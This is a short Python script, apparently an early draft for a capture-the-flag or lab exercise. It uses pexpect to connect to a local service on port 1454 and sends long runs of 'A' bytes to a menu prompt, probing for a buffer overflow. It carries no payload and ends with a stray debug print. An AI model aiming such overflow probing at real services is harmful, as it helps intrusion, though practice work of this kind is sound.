import pexpect
import sys
from pwn import *

def send(data):
    p.sendline('1')
    p.expect(': ')
    p.sendline(data)

p = pexpect.spawn('nc localhost 1454')
p.logfile = sys.stdout.buffer
p.expect('> ')
send(b'A'*104)
p.expect('> ')
send(b'A'*103)



p.interact('a')
print("kkjkj")

